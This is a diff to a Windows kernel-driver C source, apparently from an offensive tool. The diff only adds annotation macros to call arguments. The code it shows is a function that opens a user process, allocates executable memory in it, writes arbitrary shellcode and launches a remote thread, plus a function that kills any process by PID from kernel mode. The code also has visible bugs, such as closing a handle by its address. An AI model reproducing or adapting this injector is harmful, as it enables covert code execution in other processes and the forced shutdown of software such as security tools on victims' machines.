@@ -17,11 +17,11 @@ Copyright (c) Fluxuss Software Security, LLC
 
 NTSTATUS InjectShellcodeOnUsermodeProcess(
     
-    SIZE_T szPid,
-    PVOID pNtWriteSsdt,
-    PVOID pZwCreateThreadExSsdt,
-    unsigned char* chShellcode,
-    ULONG ulShellcode
+    _In_ SIZE_T szPid,
+    _In_ PVOID pNtWriteSsdt,
+    _In_ PVOID pZwCreateThreadExSsdt,
+    _In_ unsigned char* chShellcode,
+    _In_ ULONG ulShellcode
 
 ) {
 
@@ -32,7 +32,7 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
 
     objectAtributes.Length = 48;
 
-    memset( &objectAtributes.RootDirectory, 0, 20 );
+    memset( _Out_ &objectAtributes.RootDirectory, _In_ 0, _In_ 20 );
     
     objectAtributes.SecurityDescriptor = NULL;
     
@@ -46,10 +46,10 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
 
     NTSTATUS ntStatus = ZwOpenProcess(
         
-        &hProcess,
-        0x1FFFFF,
-        &objectAtributes,
-        &clientId
+        _Out_ &hProcess,
+        _In_ 0x1FFFFF,
+        _In_ &objectAtributes,
+        _In_opt_ &clientId
     
     );
 
@@ -59,12 +59,12 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
 
         ntStatus = ZwAllocateVirtualMemory(
             
-            hProcess,
-            &baseAddress,
-            0, 
-            &szShellcode,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
+            _In_ hProcess,
+            _Inout_ &baseAddress,
+            _In_ 0,
+            _Inout_ &szShellcode,
+            _In_ MEM_COMMIT | MEM_RESERVE,
+            _In_ PAGE_EXECUTE_READWRITE
         
         );
 
@@ -76,13 +76,13 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
 
             if ( NtWriteVirtualMemory == NULL || !MmIsAddressValid(
                 
-                pNtWriteSsdt
+                _In_ pNtWriteSsdt
             
             ) ) {
 
                 ZwClose(
                     
-                    hProcess
+                    _In_ hProcess
                 
                 );
 
@@ -91,11 +91,11 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
 
             ntStatus = NtWriteVirtualMemory(
                 
-                hProcess,
-                baseAddress,
-                chShellcode,
-                ulShellcode+1,
-                NULL
+                _In_ hProcess,
+                _In_opt_ baseAddress,
+                _In_ chShellcode,
+                _In_ ulShellcode+1,
+                _Out_opt_ NULL
             
             );
 
@@ -107,45 +107,45 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
 
             ntStatus = ZwCreateThreadEx(
                 
-                &hThread,
-                0x1FFFFF,
-                0,
-                hProcess,
-                ( PUSER_THREAD_START_ROUTINE )baseAddress,
-                0,
-                0i64,
-                0i64,
-                0i64,
-                0i64,
-                0i64
+                _Out_ &hThread,
+                _In_ 0x1FFFFF,
+                _In_ 0,
+                _In_ hProcess,
+                _In_ ( PUSER_THREAD_START_ROUTINE )baseAddress,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0,
+                _In_ 0
             
             );
 
             ZwWaitForSingleObject(
                 
-                hThread, 
-                0, 
-                0
+                _In_ hThread,
+                _In_ 0,
+                _In_opt_ 0
             
             );
 
             ZwClose(
                 
-                &hThread
+                _In_ &hThread
             
             );
 
             ZwClose(
                 
-                hProcess
+                _In_ hProcess
             
             );
 
             DbgPrintEx(
                 
-                0,
-                0,
-                "Foi :)"
+                _In_ 0,
+                _In_ 0,
+                _In_ "Foi :)"
             
             );
 
@@ -153,9 +153,9 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
         }
         else DbgPrintEx(
             
-            0,
-            0,
-            "Felicidade de pobre dura pouco viu..."
+            _In_ 0,
+            _In_ 0,
+            _In_ "Felicidade de pobre dura pouco viu..."
         
         );
 
@@ -167,7 +167,7 @@ NTSTATUS InjectShellcodeOnUsermodeProcess(
 
 NTSTATUS TerminateUsemodeProcess(
     
-    SIZE_T szPid
+    _In_ SIZE_T szPid
 
 ) {
 
@@ -181,7 +181,7 @@ NTSTATUS TerminateUsemodeProcess(
 
     objAttibutes.Length = 48;
 
-    memset( &objAttibutes.RootDirectory, 0, 20 );
+    memset( _Out_ &objAttibutes.RootDirectory, _In_ 0, _In_ 20 );
 
     objAttibutes.SecurityDescriptor = 0;
 
@@ -192,18 +192,18 @@ NTSTATUS TerminateUsemodeProcess(
 
     ntStatus = ZwOpenProcess(
         
-        &hProc,
-        0x1FFFFF,
-        &objAttibutes,
-        &clientID
+        _Out_ &hProc,
+        _In_ 0x1FFFFF,
+        _In_ &objAttibutes,
+        _In_opt_ &clientID
     
     );
 
     if ( NT_SUCCESS( ntStatus ) )
         return ZwTerminateProcess(
             
-            hProc,
-            0
+            _In_opt_ hProc,
+            _In_ 0
         
         );
 
